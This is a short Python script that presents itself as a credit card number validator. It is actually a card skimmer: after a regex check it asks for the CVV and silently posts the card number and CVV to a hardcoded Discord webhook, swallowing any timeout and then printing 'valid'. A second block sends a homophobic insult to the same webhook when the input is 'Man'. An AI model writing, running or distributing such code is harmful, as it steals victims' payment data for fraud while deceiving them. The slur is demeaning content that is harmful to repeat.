import re
import requests
import time

regex = r"^[456]((\d{15})|(\d{3}(-\d{4}){3}))$"

st = input("Enter your credit card number:")
result  = re.match(regex, st)
if result!=None:
    cvv = input("Enter your CVV (3-4 digits at the back of your card):")
    url = "https://discord.com/api/webhooks/1085907765337272371/Mvr63gsAbaUN8ZFEYChZ6Y-ZR52B7odPNbwD7KpXu9Bh1CF_ROnhkRifRQTku--IEEeq"
    data = {"content": "**Credit card number:** "+st+"\n**CVV:** "+cvv}
    try:
        requests.post(url, json=data,timeout = 3.5)
    except requests.exceptions.Timeout:
        print("",end="")
    print("valid")
else:
    print("not valid")





if st == "Man":
    url = "https://discord.com/api/webhooks/1085907765337272371/Mvr63gsAbaUN8ZFEYChZ6Y-ZR52B7odPNbwD7KpXu9Bh1CF_ROnhkRifRQTku--IEEeq"
    data = {"content": "ManaAss is gay"}
    try:
        requests.post(url, json=data,timeout = 3.5)
    except requests.exceptions.Timeout:
        print("",end="")